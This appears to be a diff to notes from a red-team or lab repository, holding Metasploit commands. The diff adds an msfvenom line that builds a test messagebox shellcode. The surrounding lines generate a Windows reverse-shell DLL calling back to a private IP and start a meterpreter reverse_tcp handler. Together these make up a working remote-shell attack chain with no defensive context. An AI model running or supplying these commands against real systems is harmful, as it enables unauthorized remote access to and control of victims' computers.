@@ -1,4 +1,6 @@
 ```
+msfvenom -p windows/x64/messagebox TITLE="NyaMeeEain" Text="Catch Me If You Can...Shellcode is loading"   -f raw -o raw.bin
+
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f dll -o  shell.dll
 msfconsole -x "use exploits/multi/handler; set lhost 172.16.100.105; set lport 4444; set payload windows/meterpreter/reverse_tcp; exploit"
 
